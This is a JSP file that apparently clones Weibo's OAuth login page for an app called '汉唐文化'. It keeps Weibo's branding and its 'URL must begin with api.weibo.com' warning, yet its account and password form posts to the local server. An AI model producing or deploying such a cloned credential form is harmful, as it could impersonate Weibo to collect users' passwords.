<%@ page language="java" import="java.util.*" pageEncoding="UTF-8"%>
<%
String path = request.getContextPath();
String basePath = request.getScheme()+"://"+request.getServerName()+":"+request.getServerPort()+path+"/";
%>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>网站连接 - 汉唐文化</title>
<script type="text/javascript" async="" charset="utf-8" src="http://c.cnzz.com/core.php?web_id=30088308&amp;t=q"></script>
<link type="text/css"
	href="/oauth2/css/oauthV3/oauth_web.css?version=20140625"
	rel="stylesheet">
<link rel="stylesheet" type="text/css"
	href="/oauth2/css/qrcode/pc-qrcode.css">

<!--<style>
        body { padding-bottom:300px; }
    </style>-->
</head>
<body class="WB_UIbody WB_widgets">
	<div class="WB_xline1 oauth_xline" id="outer">
		<div class="oauth_wrap">
			<div class="oauth_header clearfix">
				<h1 class="WB_logo" title="微博">
					<a href="http://weibo.com">微博</a>
				</h1>
				<p class="login_account">
					<a href="###" class="special_login_link" node-type="loginswitch">二维码登录</a>
					<span class="vline vline_login">|</span> <a class="sign_up_link"
						href="http://weibo.com/signup/signup.php?from=zw&amp;appsrc=12rpOz&amp;backurl=https%3A%2F%2Fapi.weibo.com%2F2%2Foauth2%2Fauthorize%3Fclient_id%3D646534091%26response_type%3Dcode%26display%3Ddefault%26redirect_uri%3Dhttp%253A%252F%252Ffly.layui.com%252Fapp%252Fweibo%252Fcall%252F%26from%3D%26with_cookie%3D"
						target="_blank">注册</a>
				</p>
			</div>
			<!-- 带头像  -->
			<div class="WB_panel oauth_main">
				<form name="authZForm" action="/oauth2/authorize" method="post"
					node-type="form">
					<div class="oauth_content" node-type="commonlogin" style="">
						<p class="oauth_main_info">
							使用你的微博帐号访问 <a href="http://app.weibo.com/t/feed/12rpOz"
								target="_blank" class="app_name">汉唐文化</a> ，并同时登录微博
						</p>
						<!-- 登录 -->
						<div class="oauth_login clearfix">
							<!-- <form name="authZForm" action="authorize" method="post" node-type="form"> -->
							<input type="hidden" name="action" id="action" value="login">
							<input type="hidden" id="display" name="display" value="default">
							<input type="hidden" name="withOfficalFlag" id="withOfficalFlag"
								value="0"> <input type="hidden" name="quick_auth"
								id="quick_auth" value="false"> <input type="hidden"
								name="withOfficalAccount" id="withOfficalAccount" value="">
							<input type="hidden" name="scope" id="scope" value=""> <input
								type="hidden" name="ticket" id="ticket" value=""> <input
								type="hidden" name="isLoginSina" id="isLoginSina" value="">
							<input type="submit" style="position: absolute; top: -9999px">
							<input type="hidden" name="response_type" value="code"> <input
								type="hidden" name="regCallback"
								value="https%3A%2F%2Fapi.weibo.com%2F2%2Foauth2%2Fauthorize%3Fclient_id%3D646534091%26response_type%3Dcode%26display%3Ddefault%26redirect_uri%3Dhttp%253A%252F%252Ffly.layui.com%252Fapp%252Fweibo%252Fcall%252F%26from%3D%26with_cookie%3D">
							<input type="hidden" name="redirect_uri"
								value="http://fly.layui.com/app/weibo/call/"> <input
								type="hidden" name="client_id" value="646534091"> <input
								type="hidden" name="appkey62" value="12rpOz"> <input
								type="hidden" name="state" value=""> <input
								type="hidden" name="verifyToken" value="null"> <input
								type="hidden" name="from" value=""> <input type="hidden"
								name="switchLogin" id="switchLogin" value="0">
							<div class="oauth_login_form">
								<p class="oauth_login_01">
									<label class="oauth_input_label">帐号：</label> <input type="text"
										class="WB_iptxt oauth_form_input" id="userId" name="userId"
										value="请用微博帐号登录" node-type="userid" autocomplete="off"
										tabindex="1" style="color: rgb(154, 154, 154);">
								</p>
								<p>
									<label class="oauth_input_label">密码：</label> <input
										type="password" class="WB_iptxt oauth_form_input" id="passwd"
										name="passwd" node-type="passwd" autocomplete="off"
										tabindex="2">
								</p>
								<p class="oauth_code" node-type="validateBox"
									style="display: none">
									<label class="oauth_input_label">验证码：</label> <input
										type="text" tabindex="3" node-type="vcode"
										class="WB_iptxt oauth_form_input oauth_form_code"> <span
										class="code_img"><img node-type="pincode" width="75"
										height="30"></span> <a class="WB_text2" node-type="changeCode"
										href="#">换一换</a>
								</p>
								<p class="oauth_code" node-type="vdunBox" style="display: none">
									<label class="oauth_input_label">微盾动态码：</label> <input
										type="text" tabindex="3"
										class="WB_iptxt oauth_form_input oauth_form_wd"
										node-type="vdun" maxlength="6">
								</p>
							</div>
							<!-- </form> -->
							<div class="tips WB_tips_yls WB_oauth_tips" node-type="tipBox"
								style="display: none">
								<span class="WB_tipS_err"></span><span class="WB_sp_txt"
									node-type="tipContent"></span> <span class="arr"
									node-type="tipArrow"></span> <a href="javascript:;"
									class="close" node-type="tipClose"></a>
							</div>
						</div>
						<div class="oauth_login_box01 clearfix">
							<div class="oauth_login_submit">
								<p class="oauth_formbtn">
									<a node-type="submit" tabindex="4" action-type="submit"
										href="javascript:;" class="WB_btn_login formbtn_01"></a> <a
										node-type="cancel" tabindex="5" href="javascript:;"
										action-type="cancel" class="WB_btn_cancel"></a>
								</p>
							</div>
							<!-- todo 添加appkey 白名单判断 -->
						</div>
						<!-- /登录 -->
					</div>
				</form>
			</div>
			<!-- /带头像 -->
			<!-- 根据域名修改文案 -->
			<p class="oauth_tiptxt">提示：为保障帐号安全，请认准本页URL地址必须以 api.weibo.com 开头</p>
		</div>
	</div>

	<!-- 二维码蒙层部分 -->
	<div class="qr-cover" style="display: none;" node-type="qrcodelogin">
		<div class="qr-cover-inner">
			<h1 class="qr-title">用微博账号安全登录</h1>
			<div class="qr-code" node-type="qrimage"></div>
			<div class="qr-tip">
				<div class="qr-txt">使用微博客户端扫描二维码登录“汉唐文化”</div>
				<div class="qr-ltxt">提示：为保障帐号安全，请认准本页URL地址必须以 api.weibo.com 开头</div>
			</div>
			<div class="qr-change">
				<a href="#" onclick="return false;" action-type="qrmsgclose"
					class="qr-change-logo"></a>
			</div>
		</div>
	</div>
	<!-- /二维码蒙层部分 -->
	<script src="/oauth2/js/qrcode_login.js?version=20140625"
		charset="utf-8"></script>
	<script type="text/javascript"
		src="/oauth2/js/oauth2Web.min.js?version=20160727"></script>
	<label
		style="position: absolute; width: 258px; height: 30px; line-height: 30px; color: rgb(154, 154, 154); margin: 0px; padding: 0px 9px; left: 323px; top: 169px; font-size: 14px;">请输入密码</label>
	<script src="/oauth2/js/sso/ssologinqr.min.js?version=20160803"
		charset="utf-8"></script>
	<script type="text/javascript">
    (function () {
        if (self !== top) {
            var img = new Image();
            var src = 'https://api.weibo.com/oauth2/images/bg_layerr.png?oauth=1&page=web&refer=' + document.referrer + '&rnd=' + (+new Date());
            img.src = src;
            img = null; //释放局部变量
        }
    })();
</script>

</body>
</html>